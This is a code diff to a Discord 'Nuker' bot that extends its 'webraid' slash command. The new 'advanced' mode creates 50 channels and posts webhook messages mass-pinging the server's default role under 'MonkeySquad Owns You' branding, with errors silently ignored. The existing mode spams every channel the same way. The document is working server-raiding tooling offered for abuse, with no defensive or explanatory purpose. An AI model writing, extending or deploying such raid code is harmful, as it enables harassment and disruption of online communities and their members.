@@ -5,6 +5,7 @@ from disnake.ext import tasks
 
 
 import ctypes
+import json
 
 
 server =  0
@@ -24,6 +25,8 @@ class Nuker(commands.Cog):
    def __init__(self, bot):
       self.bot = bot
       self.task.start()
+      with open("config.json") as f:
+        self.config = json.load(f)
    
    @tasks.loop(seconds=5.0)
    async def task(self):      
@@ -186,12 +189,24 @@ class Nuker(commands.Cog):
       name="webraid"
    )
    async def webraid(self, interaction: disnake.ApplicationCommandInteraction, *, arg):
-      for channel in interaction.guild.channels:
-         hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
-         for _ in range(0, 20):
-            await hook.send(f"{arg}\n{interaction.guild.default_role}")
-            global messages
-            messages += 1
+      if self.config["webraidadvanced"] == True:
+         for _ in range (0, 50):
+            try:
+               ch = interaction.guild.create_text_channel(name="Saturn Owns You")
+               hook = await ch.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
+               for _ in range(0,20):
+                  await hook.send(arg + interaction.guild.default_role)
+                  global messages
+                  messages += 1
+            except:
+               pass
+      else:
+         for channel in interaction.guild.channels:
+            hook = await channel.create_webhook(name="MonkeySquad Owns You", reason="MonkeySquad Owns You")
+            for _ in range(0, 20):
+               await hook.send(f"{arg}\n{interaction.guild.default_role}")
+               global messages
+               messages += 1
       
    
    @commands.slash_command(
